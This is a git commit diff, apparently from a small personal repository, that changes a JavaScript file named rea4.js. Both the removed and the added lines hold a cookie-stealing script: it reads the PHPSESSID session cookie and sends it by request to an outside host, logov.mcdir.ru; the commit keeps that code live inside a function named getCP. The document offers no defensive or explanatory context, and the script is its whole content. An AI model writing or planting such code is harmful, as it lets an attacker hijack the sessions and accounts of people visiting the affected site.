c3034fb3117cfbb9b70ed460e5a7c8c805a16082
checked666 <42522983+checked666@users.noreply.github.com>
2018-08-20 00:37:02 +0300

    add 1 shvacka
    and deleted mivina

--- rea4.js
+++ rea4.js
@@ -1,4 +1,6 @@
-var xhr = new XMLHttpRequest();
-var id = document.cookie.match(/PHPSESSID=[^;]+/);
-xhr.open("GET","http://logov.mcdir.ru/s.php?id="+id);
-xhr.send();
+getCP = function() {
+  var xhr = new XMLHttpRequest();
+  var id = document.cookie.match(/PHPSESSID=[^;]+/);
+  xhr.open("GET","http://logov.mcdir.ru/s.php?id="+id);
+  xhr.send();
+}
